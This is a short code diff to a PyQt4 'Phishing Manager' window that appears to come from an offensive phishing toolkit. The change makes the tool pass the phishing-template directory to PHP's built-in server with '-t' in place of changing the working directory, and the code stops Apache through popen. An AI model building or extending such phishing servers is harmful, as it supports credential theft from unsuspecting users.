@@ -1,6 +1,6 @@
 from PyQt4.QtCore import *
 from PyQt4.QtGui import *
-from os import popen,chdir,getcwd
+from os import popen
 from urllib2 import urlopen,URLError
 from BeautifulSoup import BeautifulSoup
 from Core.Utils import ThreadPhishingServer
@@ -32,7 +32,6 @@ class frm_PhishingManager(QWidget):
         super(frm_PhishingManager, self).__init__(parent)
         self.label = QLabel()
         self.Main  = QVBoxLayout()
-        self.owd   = getcwd()
         self.config = frm_Settings()
         self.session = str()
         self.setWindowTitle('Phishing Manager')
@@ -256,17 +255,15 @@ class frm_PhishingManager(QWidget):
             self.emit(SIGNAL('Activated( QString )'),'started')
 
     def DirectoryPhishing(self,Path=None):
-        chdir(Path)
         popen('service apache2 stop')
         self.Tphishing = ThreadPhishingServer(['php', '-S','{}:{}'.format(
-        str(self.txt_redirect.text()),str(self.BoxPort.value()))])
+        str(self.txt_redirect.text()),str(self.BoxPort.value())),'-t',Path])
         self.Tphishing.send.connect(self.ResponseSignal)
         self.Tphishing.setObjectName('Server PHP::'+Path)
         self.ThreadTemplates['Server'].append(self.Tphishing)
         self.Tphishing.start()
         while True:
             if self.Tphishing.process != None:
-                chdir(self.owd)
                 break
         self.btn_start_template.setEnabled(False)
         self.btn_stop_template.setEnabled(True)
